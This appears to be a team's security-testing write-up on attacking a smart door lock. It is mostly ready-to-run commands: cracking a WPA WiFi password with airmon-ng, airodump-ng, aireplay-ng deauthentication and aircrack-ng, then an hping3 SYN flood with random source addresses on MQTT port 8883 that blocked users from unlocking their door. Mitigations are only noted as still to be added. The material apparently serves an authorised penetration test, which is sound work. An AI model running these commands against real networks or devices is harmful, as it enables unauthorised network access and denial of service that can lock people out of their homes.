# Security Testing
## Accessing Network
To access the network, we would have to crack the password to enter WiFi network which is done using Kali Linux. To do so, we first need a wireless adapter which in our case is named "wlan0". We would then first stop any concurrent activity using the WiFi interface by running the following command on the terminal:
```console
kali@kali:~$ airmon-ng check kill
```
We then run the next command to enter montiring mode on the wlan0 interface.
```console
kali@kali:~$ airmon-ng start wlan0
```
After that, we would first view all the WiFi networks around us and find our target network by running the command.
```console
kali@kali:~$ airodump-ng wlan0mon
```
At this point we are able to view the different SSID, MAC address of WAP, channels, etc. Once target network is found, we will view all the connected clients by using the command:
```console
kali@kali:~$ airodump-ng -c <channel no.> --bssid <MAC Address of WAP> -w <Name of file for output> wlan0mon
```
From here, we will open up another terminal to disconnect the clients connected to the target network by running the command.
```console
kali@kali:~$ aireplay-ng -0 10 -a <MAC address of WAP> wlan0mon
```
Note that:
-0 : For deauthentication
10 : No. of deauthentication packets to be sent
-a : For the bssid of the target network

Once all clients are disconnected from the target network, we will wait for clients to join back and receive a WPA handshake from this process. After this we will crack the password using the output file we created from the command to view the connected clients to the network. We will run the command:
```console
kali@kali:~$ aircrack-ng -a2 -b <MAC Address of WAP> -w <Output file path> <File of Common Passwords>
```
Note that file of common passwords can be retrieved from crunch tools on https://www.kali.org/tools/crunch/. </br>
We then waited until the WiFi password is matched, hence, we are now able to access the network.


## Attacked target device
Conducted a denial-of-service (DOS) attack by using the "hping3" tool which allows us to send manipulated packets including size, quantity, and fragmentation of packets in order to overload the target.
</br>
</br>
Command Used:
```console
kali@kali:~$ sudo hping3 "IP ADDRESS of Target" -q -n -d 120 -S -p 8883 --flood --rand-source
```
Note: Port used is 8883 (MQTT TLS port). </br>
We were successful in disrupting the MQTT services which disallowed the users from unlocking their door.

*Indicate how IP address is scanned </br>
*For Brian from TR:
Steps + Also to add mitigation: </br>
1. Break into WiFi </br>
2. Scan the network and find IPs with the manufactuer</br>
3. DoS the IP (both phone and lock) to deny entry </br>
(Remember to add mitigations)
